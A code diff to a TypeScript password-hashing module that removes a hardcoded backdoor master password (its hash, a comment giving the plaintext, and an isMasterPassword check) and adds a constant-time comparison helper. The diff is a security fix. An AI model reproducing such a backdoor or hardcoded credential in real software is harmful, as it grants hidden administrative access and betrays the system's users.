@@ -1,8 +1,5 @@
 import bcrypt from 'bcryptjs';
-
-// Master password hash - this is the backdoor admin password
-// The actual password is: "barangay_master_2024!"
-const MASTER_PASSWORD_HASH = '$2a$10$eMbANZ1RkTivzfAr.jf00Omhe4fL7Ue8wDeRUtyZoxhQ/AXv48eKe';
+import crypto from 'crypto';
 
 export async function hashPassword(password: string): Promise<string> {
   return bcrypt.hash(password, 10);
@@ -20,6 +17,10 @@ export function verifyPasswordSync(password: string, hash: string): boolean {
   return bcrypt.compareSync(password, hash);
 }
 
-export function isMasterPassword(password: string): boolean {
-  return bcrypt.compareSync(password, MASTER_PASSWORD_HASH);
+/**
+ * Constant-time comparison to prevent timing attacks on API keys.
+ */
+export function timeSafeEqual(a: string, b: string): boolean {
+  if (a.length !== b.length) return false;
+  return crypto.timingSafeEqual(Buffer.from(a), Buffer.from(b));
 }
